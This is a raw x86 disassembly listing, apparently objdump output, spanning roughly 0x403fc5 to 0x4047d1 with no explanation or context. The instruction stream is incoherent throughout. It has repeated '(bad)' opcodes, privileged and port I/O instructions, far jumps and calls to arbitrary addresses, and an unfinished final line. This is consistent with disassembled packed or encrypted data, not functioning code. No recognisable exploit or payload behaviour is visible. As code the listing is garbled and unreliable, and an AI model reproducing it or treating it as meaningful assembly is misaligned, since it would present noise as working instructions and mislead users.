  403fc5:	je     0x403fd9
  403fc7:	(bad)  
  403fc8:	aam    0x28
  403fca:	aas    
  403fcb:	nop
  403fcc:	mov    dl,0x96
  403fce:	(bad)  
  403fd0:	das    
  403fd1:	jae    0x403fc5
  403fd3:	int    0x29
  403fd5:	iret   
  403fd6:	push   0xfffffffe
  403fd8:	stc    
  403fd9:	xor    dl,bh
  403fdb:	icebp  
  403fdc:	icebp  
  403fdd:	mov    cl,0x55
  403fdf:	push   eax
  403fe0:	cmp    BYTE PTR ds:0x81462881,0x71
  403fe7:	pop    esi
  403fe8:	outs   dx,DWORD PTR ds:[esi]
  403fe9:	ins    DWORD PTR es:[edi],dx
  403fea:	dec    ecx
  403feb:	add    eax,0x27672bd9
  403ff0:	add    DWORD PTR [ebp+0xc],edx
  403ff3:	adc    eax,0x8f488741
  403ff8:	gs jmp 0x6c5e:0x94be4ac4
  404000:	addr16 pop ss
  404002:	sub    BYTE PTR [ebx+eax*4-0x7d06a5a9],0x37
  40400a:	aas    
  40400b:	aaa    
  40400c:	scas   al,BYTE PTR es:[edi]
  40400d:	and    BYTE PTR [edx],0x9
  404010:	in     al,dx
  404011:	imul   esi,edi,0x864e9b8d
  404017:	sar    DWORD PTR [ebp+0x2022eb84],0x68
  40401e:	mov    ebp,0xcb8f4c2b
  404023:	xchg   edi,eax
  404024:	call   0x5920043b
  404029:	call   0x961d74df
  40402e:	fldcw  WORD PTR [edx+0x2a]
  404031:	sbb    DWORD PTR [edi],ebx
  404033:	xchg   BYTE PTR [edi+0x758862f6],ah
  404039:	xlat   BYTE PTR ds:[ebx]
  40403a:	dec    edi
  40403b:	pop    eax
  40403c:	pop    esp
  40403d:	in     eax,0x45
  40403f:	and    al,0xd5
  404041:	mov    eax,ds:0x407fccd1
  404046:	sbb    al,0xf1
  404048:	jne    0x403fee
  40404a:	fsub   DWORD PTR [edx+0x589bbbdf]
  404050:	dec    eax
  404051:	shl    BYTE PTR [ecx],cl
  404053:	leave  
  404054:	adc    eax,0x6b443ee8
  404059:	mov    dl,0xa1
  40405b:	sahf   
  40405c:	jecxz  0x404098
  40405e:	pop    esi
  40405f:	inc    ecx
  404060:	out    dx,al
  404061:	enter  0x7393,0x20
  404065:	ret    0x503c
  404068:	pop    ss
  404069:	into   
  40406a:	jl     0x404098
  40406c:	scas   al,BYTE PTR es:[edi]
  40406d:	outs   dx,BYTE PTR ds:[esi]
  40406e:	outs   dx,DWORD PTR ds:[esi]
  40406f:	out    dx,al
  404070:	dec    ecx
  404071:	movlps xmm1,QWORD PTR [ebp+0x5dc3044]
  404078:	rcr    ah,0xf9
  40407b:	xchg   esi,eax
  40407c:	mov    ah,al
  40407e:	lds    ecx,FWORD PTR [ecx+0x5a]
  404081:	pop    ss
  404082:	js     0x40402e
  404084:	mov    eax,ds:0x9e522521
  404089:	or     ebp,DWORD PTR [edi]
  40408b:	je     0x404083
  40408d:	mov    edi,0x6ad56939
  404092:	cld    
  404093:	pop    edx
  404094:	retf   
  404095:	cmc    
  404096:	outs   dx,DWORD PTR ds:[esi]
  404097:	mov    ecx,0x3c5abaf2
  40409c:	out    dx,eax
  40409d:	pop    ss
  40409e:	inc    ebx
  40409f:	out    0x54,eax
  4040a1:	cli    
  4040a2:	in     al,dx
  4040a3:	mov    eax,0x6ab1f01c
  4040a8:	push   0x198fa76a
  4040ad:	lahf   
  4040ae:	jmp    0x404044
  4040b0:	cmp    ebp,0x869b3e8
  4040b6:	mov    al,ds:0x9b79ca21
  4040bb:	mov    esp,0x6a6dd154
  4040c0:	test   DWORD PTR [esi+0x794bdcd7],esi
  4040c6:	out    dx,eax
  4040c7:	add    BYTE PTR [ecx],bl
  4040c9:	xlat   BYTE PTR ds:[ebx]
  4040ca:	(bad)  
  4040cb:	mov    edi,0xb5419fd6
  4040d0:	xor    DWORD PTR [ecx+eiz*1-0x38],esp
  4040d4:	es imul esp,esp,0xffffffa5
  4040d8:	ror    DWORD PTR [edi+0x7372de5e],1
  4040de:	jmp    0x1cd6:0xe7040508
  4040e5:	xchg   edx,eax
  4040e6:	fwait
  4040e7:	inc    eax
  4040e8:	xchg   edi,eax
  4040e9:	int    0xaf
  4040eb:	out    0x4b,eax
  4040ed:	ins    DWORD PTR es:[edi],dx
  4040ee:	int    0xc
  4040f0:	push   es
  4040f1:	in     al,dx
  4040f2:	fs aad 0x4b
  4040f5:	lods   eax,DWORD PTR ds:[esi]
  4040f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040f7:	mov    cl,BYTE PTR [ebp+0x4600850e]
  4040fd:	cmp    dl,BYTE PTR [edx+0x51e73eca]
  404103:	push   edx
  404104:	add    ch,BYTE PTR [ebx+ebp*1]
  404107:	dec    ecx
  404108:	retf   
  404109:	push   0xe16cc8a9
  40410e:	mov    dh,0xb6
  404110:	jmp    0x12bf:0x4f287d98
  404117:	data16 int3 
  404119:	out    0xd6,al
  40411b:	sbb    DWORD PTR [ecx-0x2887b9c8],edi
  404121:	and    edi,edx
  404123:	adc    DWORD PTR [ecx],edx
  404125:	cmp    al,0x5b
  404127:	or     eax,DWORD PTR [edx+ecx*2]
  40412a:	in     al,dx
  40412b:	clc    
  40412c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40412d:	dec    esp
  40412e:	call   0xd3b56766
  404133:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  404135:	xchg   esp,eax
  404136:	add    DWORD PTR [ebx+0x7ef206ff],esp
  40413c:	ficomp WORD PTR [ecx-0x78]
  40413f:	fistp  QWORD PTR [ecx]
  404141:	fsubr  DWORD PTR ds:0x6838578c
  404147:	cs push eax
  404149:	jle    0x4040f1
  40414b:	into   
  40414c:	add    bl,BYTE PTR [ebp+0x67]
  40414f:	(bad)  
  404150:	mov    ah,0x1f
  404152:	test   al,0xf8
  404154:	jmp    0x4041cf
  404156:	xor    al,0xed
  404158:	inc    ecx
  404159:	xor    eax,0xb7b3510
  40415e:	(bad)  
  40415f:	pop    ss
  404160:	pushf  
  404161:	sub    ah,ch
  404163:	test   eax,0xc5549c7e
  404168:	out    dx,eax
  404169:	and    DWORD PTR [eax],ecx
  40416b:	sbb    ebx,edx
  40416d:	popf   
  40416e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40416f:	jmp    0x4985:0xab2c76b5
  404176:	dec    DWORD PTR [ebx+ebx*2-0x3d]
  40417a:	mov    BYTE PTR [ebp+0x62],dl
  40417d:	xchg   ecx,eax
  40417e:	rcr    DWORD PTR [esi-0x6c],1
  404181:	jb     0x40412d
  404183:	pop    DWORD PTR [ebx-0xe4b40cf]
  404189:	mov    al,ds:0x5fcf050d
  40418e:	jle    0x4041c6
  404190:	mov    ah,0x59
  404192:	sar    BYTE PTR [esi-0x5e2135ed],1
  404198:	xor    DWORD PTR [edx+0x61e6ce43],0xed6bc9e0
  4041a2:	push   0x81ecebe1
  4041a7:	xchg   esp,eax
  4041a8:	dec    esi
  4041a9:	push   0x808b2184
  4041ae:	jae    0x404137
  4041b0:	in     al,0xcc
  4041b2:	fld    TBYTE PTR [eax-0x7a]
  4041b5:	je     0x4041a6
  4041b7:	inc    ebx
  4041b8:	mov    BYTE PTR [ebx-0x3],cl
  4041bb:	(bad)  
  4041bc:	frstor [eax+ebx*8+0x2f]
  4041c0:	pop    es
  4041c1:	sbb    al,0xdb
  4041c3:	(bad)  
  4041c4:	mov    edx,0x192cb539
  4041c9:	and    ecx,DWORD PTR [eax]
  4041cb:	inc    esi
  4041cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041cd:	aam    0x7d
  4041cf:	add    DWORD PTR [esi+eiz*2-0x50cb69c2],edx
  4041d6:	mov    ah,0x99
  4041d8:	loopne 0x40417b
  4041da:	mov    eax,0x30ab9bf3
  4041df:	les    esi,FWORD PTR [esi+eiz*1+0x7b20d27a]
  4041e6:	jge    0x404257
  4041e8:	jmp    0x23d37232
  4041ed:	in     eax,dx
  4041ee:	in     al,0xd5
  4041f0:	sahf   
  4041f1:	jno    0x4041b7
  4041f3:	test   BYTE PTR ds:[ebp-0x4a853696],ch
  4041fa:	out    0x11,eax
  4041fc:	sbb    DWORD PTR [ebx],ebx
  4041fe:	sub    esi,eax
  404200:	inc    ecx
  404201:	adc    ecx,ecx
  404203:	mov    dh,0x21
  404205:	push   ebx
  404206:	sbb    al,0xd5
  404208:	jmp    0xb0186f46
  40420d:	pushf  
  40420e:	(bad)  
  40420f:	mov    dh,0x50
  404211:	jo     0x4041ba
  404213:	fs ins DWORD PTR es:[edi],dx
  404215:	mov    edx,0x9b226e7b
  40421a:	pop    ss
  40421b:	sub    DWORD PTR ds:0x3f81497b,eax
  404221:	es pushf 
  404223:	std    
  404224:	push   ds
  404225:	dec    esp
  404226:	pop    fs
  404228:	into   
  404229:	sbb    esi,DWORD PTR [ebx+ecx*1]
  40422c:	or     ecx,DWORD PTR [edi-0x46eb23b7]
  404232:	outs   dx,BYTE PTR es:[esi]
  404234:	push   ebp
  404235:	pop    ds
  404236:	sbb    al,0xd2
  404238:	jecxz  0x4041d9
  40423a:	jecxz  0x404267
  40423c:	mov    esi,0x4966f132
  404241:	add    ch,BYTE PTR ds:0x47f75247
  404247:	or     al,0xb7
  404249:	add    edi,edi
  40424b:	xchg   ecx,eax
  40424c:	push   cs
  40424d:	aam    0x90
  40424f:	retf   
  404250:	dec    ebx
  404251:	pop    eax
  404252:	pop    es
  404253:	mov    dl,0xbb
  404255:	adc    eax,0x23052a95
  40425a:	(bad)
  40425e:	or     dh,dh
  404260:	dec    BYTE PTR [eax-0x46]
  404263:	int3   
  404264:	xor    BYTE PTR [edx+0x312b3d6d],dh
  40426a:	sub    BYTE PTR [ecx],0x6a
  40426d:	mov    eax,0x4dd0e762
  404272:	bound  edi,QWORD PTR [ebx+0x9]
  404275:	mov    ch,0xa5
  404277:	rcl    eax,1
  404279:	mov    bl,0xd5
  40427b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40427c:	(bad)  
  40427d:	test   BYTE PTR [edx-0x20c94031],ch
  404283:	and    DWORD PTR [edx+0x3b],edi
  404286:	and    al,0x90
  404288:	xchg   DWORD PTR [eax-0x58131edc],edx
  40428e:	push   ss
  40428f:	loopne 0x4042d4
  404291:	xor    ebx,0x72
  404294:	sub    esi,ebx
  404296:	xchg   ecx,eax
  404297:	packsswb mm4,QWORD PTR [eax+0x55]
  40429b:	dec    esp
  40429d:	cmp    al,0xb9
  40429f:	push   ds
  4042a0:	push   ebx
  4042a1:	pop    ebp
  4042a2:	lods   al,BYTE PTR fs:[esi]
  4042a4:	out    dx,al
  4042a5:	cmp    BYTE PTR [ecx-0x29],cl
  4042a8:	fcmovne st,st(2)
  4042aa:	xor    BYTE PTR [esi+0x741ba13b],dh
  4042b0:	xchg   BYTE PTR [ebx+0x3b],ah
  4042b3:	(bad)  
  4042b4:	mov    bl,0x19
  4042b6:	jecxz  0x404273
  4042b8:	fnstcw WORD PTR [ebx+0x6b]
  4042bb:	add    al,bh
  4042bd:	in     al,dx
  4042be:	mov    DWORD PTR [ebx+0x5fcb67fd],edi
  4042c4:	dec    esp
  4042c5:	popf   
  4042c6:	test   eax,0xd6fdf354
  4042cb:	push   ecx
  4042cc:	xchg   edi,eax
  4042cd:	jle    0x40428c
  4042cf:	or     BYTE PTR [edi+0x38],bl
  4042d2:	pop    ebx
  4042d3:	fsubrp st(1),st
  4042d5:	cli    
  4042d6:	pop    esi
  4042d7:	ror    BYTE PTR [esi+0x12],cl
  4042da:	or     al,0xe4
  4042dc:	fdiv   QWORD PTR [edx+0x69fd8005]
  4042e2:	adc    al,0x8e
  4042e4:	out    dx,al
  4042e5:	sbb    ah,BYTE PTR [ebx]
  4042e7:	jg     0x404317
  4042e9:	push   ecx
  4042ea:	or     cl,BYTE PTR [eax-0x43b1d376]
  4042f0:	pushf  
  4042f1:	mov    ah,BYTE PTR ds:0x99365598
  4042f7:	and    BYTE PTR [edx-0xd],0xc
  4042fb:	sbb    DWORD PTR fs:[ebx-0x50],esp
  4042ff:	jns    0x40437a
  404301:	stos   DWORD PTR es:[edi],eax
  404302:	fadd   QWORD PTR [esp+ebx*2]
  404305:	mov    eax,ds:0x4b83a126
  40430a:	loopne 0x4042b0
  40430c:	in     al,0x89
  40430e:	loopne 0x4042f9
  404310:	jmp    0xad6:0x9c4bd10
  404317:	imul   eax,DWORD PTR [ecx+0x46621d18],0x217232b0
  404321:	pop    esi
  404322:	inc    eax
  404323:	dec    BYTE PTR [edx-0x28]
  404326:	call   0xfc8d2f16
  40432b:	jmp    0x180976a1
  404330:	mov    edi,0xcd2859b8
  404335:	pop    ebp
  404336:	sar    DWORD PTR [edx],1
  404338:	stos   DWORD PTR es:[edi],eax
  404339:	add    dl,ch
  40433b:	and    edi,eax
  40433d:	popf   
  40433e:	sar    DWORD PTR [ebp+ebx*1-0x53],0x67
  404343:	mov    dh,0x60
  404345:	sbb    BYTE PTR [edi],cl
  404347:	cdq    
  404348:	fwait
  404349:	pusha  
  40434a:	pop    ecx
  40434b:	adc    ch,BYTE PTR [esi-0x6f869f00]
  404351:	push   0xc12f3b40
  404356:	push   edi
  404357:	cmp    dh,BYTE PTR [edi-0x5d]
  40435a:	repz adc ah,cl
  40435d:	int    0x5e
  40435f:	adc    BYTE PTR [bp+si-0x7d99],ch
  404364:	out    dx,eax
  404365:	shl    BYTE PTR ss:0xb0f7d415,1
  40436c:	cmp    eax,DWORD PTR [esi+ebx*8-0x72a48057]
  404373:	aaa    
  404374:	add    BYTE PTR [esi+0x2e0395d],bh
  40437a:	pop    edx
  40437b:	sbb    edi,ebx
  40437d:	push   ss
  40437e:	xor    DWORD PTR [esi-0x1b8074ef],ebx
  404384:	and    al,0xd7
  404386:	retf   0x3514
  404389:	mov    eax,0x79bbc740
  40438e:	or     al,0x7d
  404390:	xor    eax,0x2c77de92
  404395:	pop    ecx
  404396:	xor    DWORD PTR [ecx+0x32],0xb907b593
  40439d:	sar    dl,0x5a
  4043a0:	sbb    al,BYTE PTR [esp+esi*1]
  4043a3:	add    ebx,0xa06527fa
  4043a9:	jne    0x4043db
  4043ab:	sub    eax,0xb90b8cb7
  4043b0:	xchg   DWORD PTR [edx+0x7b],ecx
  4043b3:	pop    edx
  4043b4:	sbb    edx,edi
  4043b6:	or     ecx,ebp
  4043b8:	mov    WORD PTR [eax-0x64],?
  4043bb:	adc    eax,0x3c7c35f4
  4043c0:	test   DWORD PTR [ebx],0x4d95a21
  4043c6:	outs   dx,BYTE PTR ds:[esi]
  4043c7:	call   0x12c3:0x32a96d7b
  4043ce:	lock cmp al,BYTE PTR [ebx]
  4043d1:	mov    ebp,0x64bd0374
  4043d6:	sbb    edx,ebx
  4043d8:	jmp    0x5984:0x2c1d9485
  4043df:	in     al,dx
  4043e0:	mov    ah,0xfd
  4043e2:	adc    ebp,DWORD PTR [edx-0x76]
  4043e5:	and    eax,0x6dab139a
  4043ea:	jge    0x404437
  4043ec:	lock or eax,0x5531fafa
  4043f2:	dec    ebx
  4043f3:	jae    0x4043f4
  4043f5:	add    eax,0xf58fde24
  4043fa:	add    bh,bh
  4043fc:	jecxz  0x404415
  4043fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043ff:	sub    cl,dl
  404401:	push   ebp
  404402:	adc    BYTE PTR [esp+ecx*2-0x716c31a3],cl
  404409:	adc    BYTE PTR [esi+eax*1+0x4d],ch
  40440d:	ret    0xac84
  404410:	shl    al,1
  404412:	mov    al,ds:0x68b5cf3
  404417:	pop    DWORD PTR ds:0xd734ab51
  40441d:	inc    ebx
  40441e:	push   ss
  40441f:	mov    eax,ds:0x45c12546
  404424:	mov    WORD PTR [esi+0x3f161c36],ds
  40442a:	sahf   
  40442b:	ss loope 0x404458
  40442e:	(bad)  
  40442f:	in     al,0x3
  404431:	jp     0x404435
  404433:	arpl   WORD PTR [ebx-0x1f],cx
  404436:	mov    bh,0xec
  404438:	pop    edx
  404439:	icebp  
  40443a:	or     BYTE PTR [ecx+0x19],dl
  40443d:	jmp    0x6fea0e21
  404442:	(bad)  
  404443:	adc    ah,ch
  404445:	sbb    al,0x67
  404447:	ficom  DWORD PTR [eax+0x5f]
  40444a:	push   0x6203a3b2
  40444f:	cmp    eax,0xff18ebe0
  404454:	mov    bh,0xeb
  404456:	(bad)  
  404458:	lds    esi,FWORD PTR ds:0x4408f11
  40445e:	fcos   
  404460:	daa    
  404461:	add    BYTE PTR [edi-0x62ae2412],dh
  404467:	(bad)  
  404468:	mov    al,ds:0x7a53fe64
  40446d:	mov    esp,0x42dbe902
  404472:	lods   al,BYTE PTR ds:[esi]
  404473:	pop    esi
  404474:	ins    DWORD PTR es:[edi],dx
  404475:	sbb    eax,0xe643255b
  40447a:	mov    BYTE PTR [esp+edi*4],dl
  40447d:	lods   al,BYTE PTR ds:[si]
  40447f:	sbb    ecx,DWORD PTR ds:0xc7e8c15f
  404485:	add    BYTE PTR [eax-0x22],dl
  404488:	mov    dh,0x59
  40448a:	in     eax,dx
  40448b:	and    al,0x50
  40448d:	scas   eax,DWORD PTR es:[edi]
  40448e:	or     eax,0x4e39b78b
  404493:	push   cs
  404494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404495:	leave  
  404496:	xor    esp,edx
  404498:	cmp    al,BYTE PTR ds:0x7c97da8a
  40449e:	sub    ah,ah
  4044a0:	dec    edx
  4044a1:	push   edi
  4044a2:	sub    al,0xaa
  4044a4:	sub    bl,ah
  4044a6:	aad    0xc9
  4044a8:	retf   
  4044a9:	xchg   esi,eax
  4044aa:	lea    esp,[edx+ecx*8+0x41625721]
  4044b1:	inc    edx
  4044b2:	(bad)  
  4044b3:	sbb    esi,DWORD PTR [eax-0x80]
  4044b6:	(bad)  
  4044b7:	fiadd  WORD PTR [ebx-0x12]
  4044ba:	mov    ch,0x5d
  4044bc:	and    al,BYTE PTR [edi-0x28]
  4044bf:	pop    es
  4044c0:	xchg   esp,eax
  4044c1:	pop    esi
  4044c2:	inc    ebp
  4044c3:	popa   
  4044c4:	idiv   dh
  4044c6:	iret   
  4044c7:	add    al,0x14
  4044c9:	xchg   ecx,eax
  4044ca:	dec    edi
  4044cb:	push   ds
  4044cc:	mov    edi,0x14d052c
  4044d1:	xor    DWORD PTR [ebp-0x7e22850c],ebx
  4044d7:	sub    DWORD PTR [ecx-0x36],0x54a0ce08
  4044de:	push   edx
  4044df:	test   bh,dh
  4044e1:	mov    DWORD PTR [esi+0x12],esp
  4044e4:	stc    
  4044e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044e6:	inc    esp
  4044e7:	jnp    0x4044db
  4044e9:	std    
  4044ea:	pop    ebx
  4044eb:	dec    ebp
  4044ec:	sub    DWORD PTR gs:[ebx-0x53717316],eax
  4044f3:	out    0x8d,eax
  4044f5:	or     al,0xe8
  4044f7:	mov    al,0x0
  4044f9:	sub    dl,0x1d
  4044fc:	lods   al,BYTE PTR ds:[esi]
  4044fd:	inc    ebx
  4044fe:	fsub   DWORD PTR [edi]
  404500:	push   0xffffffc5
  404502:	add    eax,0x5072391b
  404507:	iret   
  404508:	daa    
  404509:	adc    DWORD PTR [edx+0x34a590d2],esi
  40450f:	pop    ebp
  404510:	cld    
  404511:	test   bh,dh
  404513:	jp     0x404542
  404515:	cmp    eax,0x38ec8067
  40451a:	aas    
  40451b:	fild   WORD PTR [edx]
  40451d:	cwde   
  40451e:	rol    BYTE PTR [ebx-0x63c66f90],cl
  404524:	fdiv   st,st(1)
  404526:	mov    esp,0xdf2356f6
  40452b:	lock jnp 0x404559
  40452e:	inc    ebx
  40452f:	daa    
  404530:	leave  
  404531:	pop    esp
  404532:	jns    0x404537
  404534:	inc    esi
  404535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404536:	mov    esi,0x2f6611db
  40453b:	int3   
  40453c:	adc    BYTE PTR [ebx+ebp*8-0x4a703f20],cl
  404543:	add    bh,dl
  404545:	sbb    eax,0x63c299b7
  40454a:	cmp    eax,0x2b219b6
  40454f:	pop    ebx
  404550:	jbe    0x4044f2
  404552:	and    ecx,ebx
  404554:	adc    bh,BYTE PTR ds:0xd81ac8b2
  40455a:	pushf  
  40455b:	fidivr WORD PTR [eax+0x78]
  40455e:	mov    BYTE PTR [esi+ebx*4],al
  404561:	dec    eax
  404562:	dec    ebp
  404563:	ds shl edx,1
  404566:	mov    cl,0x5b
  404568:	dec    esi
  404569:	add    al,0x7e
  40456b:	das    
  40456c:	int3   
  40456d:	rcr    BYTE PTR [eax+0x219b1717],0xf1
  404574:	pop    esp
  404575:	test   DWORD PTR [edx-0x2],edx
  404578:	dec    edx
  404579:	push   edi
  40457a:	push   ss
  40457b:	cmp    bl,BYTE PTR [ecx+ecx*1-0x48]
  40457f:	cwde   
  404580:	mov    edx,0xd292aab6
  404585:	push   esi
  404586:	out    0xdf,al
  404588:	cld    
  404589:	or     esp,DWORD PTR [esi+0x63b88f76]
  40458f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404590:	mov    dl,0x43
  404592:	popa   
  404593:	add    ecx,DWORD PTR [ebp+0x736ab296]
  404599:	mov    bl,0x50
  40459b:	arpl   WORD PTR [ecx-0x1289c80e],di
  4045a1:	daa    
  4045a2:	xchg   edi,eax
  4045a3:	int3   
  4045a4:	call   0x3760:0x8ca196ca
  4045ab:	cmc    
  4045ac:	dec    ebp
  4045ad:	xchg   DWORD PTR gs:[esp],edi
  4045b1:	sahf   
  4045b2:	ret    
  4045b3:	inc    eax
  4045b4:	and    esp,DWORD PTR [edx+esi*8+0x26]
  4045b8:	fwait
  4045b9:	dec    esp
  4045ba:	lods   al,BYTE PTR ds:[esi]
  4045bb:	xor    esi,DWORD PTR [ecx+0x6721ba40]
  4045c1:	out    0x11,eax
  4045c3:	int    0x91
  4045c5:	mov    ebp,0x41b17191
  4045ca:	stos   BYTE PTR es:[edi],al
  4045cb:	ja     0x404553
  4045cd:	mov    ch,BYTE PTR [edi+0x50]
  4045d0:	xor    esi,edx
  4045d2:	ins    BYTE PTR es:[edi],dx
  4045d3:	pop    ecx
  4045d4:	jge    0x40458a
  4045d6:	std    
  4045d7:	gs jmp 0xd660:0x8dc1424c
  4045df:	pop    eax
  4045e0:	adc    dh,ah
  4045e2:	dec    edi
  4045e3:	cwde   
  4045e4:	xchg   ah,bh
  4045e6:	fs jmp 0xaf2:0x496b54c7
  4045ee:	in     al,dx
  4045ef:	addr16 (bad) 
  4045f1:	jns    0x404669
  4045f3:	mov    dh,0x1d
  4045f5:	jb     0x404616
  4045f7:	dec    esp
  4045f8:	xor    ecx,ebp
  4045fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045fb:	pop    esi
  4045fc:	stos   BYTE PTR es:[edi],al
  4045fd:	fisttp DWORD PTR [ecx+0x50]
  404600:	xchg   edx,eax
  404601:	sub    bl,BYTE PTR [eax+0xbdc8f02]
  404607:	loopne 0x404598
  404609:	mov    ebx,0x4ec01034
  40460e:	dec    ebx
  40460f:	(bad)  
  404610:	mov    ds:0x25596313,eax
  404615:	mov    ch,0x7c
  404617:	or     eax,0xece2e9d6
  40461c:	push   ebx
  40461d:	jle    0x4045e5
  40461f:	test   eax,0x98650be0
  404624:	push   edx
  404625:	aam    0xd3
  404627:	xchg   BYTE PTR [edi-0x77f05874],dh
  40462d:	sbb    BYTE PTR ds:0x34e74a37,0x0
  404634:	sbb    al,0xec
  404636:	mov    ebp,esi
  404638:	mov    dh,0xdb
  40463a:	dec    esi
  40463b:	cmp    BYTE PTR [esi+0x12],al
  40463e:	dec    edi
  40463f:	test   BYTE PTR [bp-0x1b],al
  404643:	in     al,dx
  404644:	xchg   ebp,eax
  404645:	mov    ah,0x70
  404647:	pop    esp
  404648:	dec    edx
  404649:	cmp    al,0xd5
  40464b:	hlt    
  40464c:	push   ss
  40464d:	sti    
  40464e:	sti    
  40464f:	push   ebx
  404650:	rol    DWORD PTR [eax+esi*4],1
  404653:	push   ebx
  404654:	and    bh,BYTE PTR [ebp-0x67]
  404657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404658:	imul   esp,esp,0xda1b6f92
  40465e:	sbb    DWORD PTR [ecx-0x2a],edx
  404661:	dec    edx
  404662:	dec    edi
  404663:	jns    0x404605
  404665:	lods   eax,DWORD PTR ds:[esi]
  404666:	das    
  404667:	push   ebx
  404668:	mov    eax,ds:0xabae30e5
  40466d:	add    eax,0x3f33a14
  404672:	daa    
  404673:	es pop ds
  404675:	int3   
  404676:	std    
  404677:	dec    edx
  404678:	or     al,0xd1
  40467a:	and    al,0x2d
  40467c:	js     0x404666
  40467e:	pop    ecx
  40467f:	call   0x93761025
  404684:	adc    DWORD PTR [eax-0x2148d445],edi
  40468a:	sub    BYTE PTR [edi],ah
  40468c:	je     0x404686
  40468e:	inc    esi
  40468f:	inc    edx
  404690:	out    dx,al
  404691:	test   DWORD PTR [esi+ecx*1],0x3dcabf96
  404698:	jge    0x404623
  40469a:	loop   0x404676
  40469c:	sbb    BYTE PTR [bp+di+0x60],ah
  4046a0:	ins    DWORD PTR es:[edi],dx
  4046a1:	dec    esp
  4046a2:	push   ebx
  4046a3:	or     ch,BYTE PTR [ecx]
  4046a5:	mov    edi,0xb6158e94
  4046aa:	loop   0x404702
  4046ac:	cmp    BYTE PTR [esi],0x6c
  4046af:	adc    dh,BYTE PTR [edi-0x2e]
  4046b2:	out    dx,al
  4046b3:	adc    eax,0x4b94a00e
  4046b8:	pop    esp
  4046b9:	jle    0x404736
  4046bb:	mov    dl,0xd2
  4046bd:	mov    esi,0x2938cb12
  4046c2:	scas   al,BYTE PTR es:[edi]
  4046c3:	outs   dx,DWORD PTR ds:[esi]
  4046c4:	arpl   WORD PTR [eax-0x17],di
  4046c7:	and    BYTE PTR [ecx-0x6b],al
  4046ca:	pushf  
  4046cb:	push   ebp
  4046cc:	push   esp
  4046cd:	mov    esi,0xd54b1b13
  4046d2:	hlt    
  4046d3:	int    0x9
  4046d5:	shr    DWORD PTR [ecx+ebp*4],0xb6
  4046d9:	sub    eax,0x30188c
  4046de:	aam    0xb2
  4046e0:	add    dl,BYTE PTR [eax-0x66ef4cfa]
  4046e6:	pop    edi
  4046e7:	scas   al,BYTE PTR es:[edi]
  4046e8:	addr16 cmp eax,0xf62968dd
  4046ee:	inc    esp
  4046ef:	loope  0x404692
  4046f1:	inc    edx
  4046f2:	push   ss
  4046f3:	add    eax,0xd8567df
  4046f8:	ficom  DWORD PTR [edx]
  4046fa:	add    BYTE PTR [eax+0x29],dl
  4046fd:	gs mov ebx,0x2084215e
  404703:	mov    eax,ds:0x6a84b7d2
  404708:	adc    ecx,DWORD PTR [edx-0x43]
  40470b:	inc    esi
  40470c:	(bad)  
  40470d:	mov    eax,0xbcfcfdea
  404712:	jmp    0x404699
  404714:	call   0x2839:0xcaef73d5
  40471b:	jmp    0xe479:0x103a62f2
  404722:	sahf   
  404723:	out    0xb5,al
  404725:	inc    BYTE PTR [eax-0xf]
  404728:	push   0x4c
  40472a:	inc    ecx
  40472b:	dec    eax
  40472c:	or     BYTE PTR [edi+0xf],cl
  40472f:	mov    esi,0x942307ee
  404734:	loop   0x40474f
  404736:	mov    eax,ds:0x5aaeea5c
  40473b:	arpl   WORD PTR [ebx-0x7a],si
  40473e:	jns    0x4046cd
  404740:	adc    DWORD PTR ds:0x49154d8c,ecx
  404746:	pop    esp
  404747:	adc    al,bl
  404749:	mov    ch,0xc9
  40474b:	adc    eax,0xbe5f0f93
  404750:	cmp    al,0xa7
  404752:	and    eax,0xed029dc6
  404757:	adc    DWORD PTR [edi+0x1c7bbbe1],esi
  40475d:	js     0x404744
  40475f:	jo     0x40475c
  404761:	pusha  
  404762:	shl    DWORD PTR [edx-0xa],1
  404765:	cwde   
  404766:	loop   0x4047e3
  404768:	dec    edi
  404769:	push   edx
  40476a:	shr    DWORD PTR [ebx],0x3a
  40476d:	outs   dx,DWORD PTR ds:[esi]
  40476f:	mov    eax,ds:0xe44c1476
  404774:	scas   al,BYTE PTR es:[edi]
  404775:	mov    eax,0x351ed91f
  40477a:	sub    dl,BYTE PTR [ebp+0x5d]
  40477d:	lahf   
  40477e:	sbb    esp,DWORD PTR [edx-0x4d1d064e]
  404784:	out    dx,al
  404785:	mov    esi,0x578f35b
  40478a:	mov    edi,0xf4b727a6
  40478f:	fwait
  404790:	dec    edx
  404791:	int3   
  404792:	sbb    al,0xcf
  404794:	xchg   DWORD PTR [edi+0x51],ecx
  404797:	jns    0x4047ad
  404799:	add    bl,BYTE PTR [eax+0x5d]
  40479c:	nop
  40479d:	push   0xcf116a45
  4047a2:	or     DWORD PTR [edx],esi
  4047a4:	adc    BYTE PTR [esi-0x38],ah
  4047a7:	in     eax,dx
  4047a8:	(bad)  
  4047a9:	cmp    DWORD PTR [edi],ebx
  4047ab:	arpl   WORD PTR [ecx+ecx*2-0x67],sp
  4047af:	fcom   QWORD PTR [edi-0x3d]
  4047b2:	xor    al,0x33
  4047b4:	xor    cl,BYTE PTR [esi-0x41]
  4047b7:	enter  0xc82d,0xb7
  4047bb:	in     al,0xf8
  4047bd:	out    dx,al
  4047be:	ins    DWORD PTR es:[edi],dx
  4047bf:	inc    edi
  4047c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047c1:	pop    ss
  4047c2:	add    esi,DWORD PTR [eax]
  4047c4:	clc    
  4047c5:	js     0x404773
  4047c7:	fucomp st(3)
  4047c9:	(bad)  
  4047ca:	push   ebp
  4047cb:	retf   
  4047cc:	pop    ss
  4047cd:	and    al,0xe1
  4047cf:	push   edi
  4047d0:	(bad)  
  4047d1:	mov    ebp,?
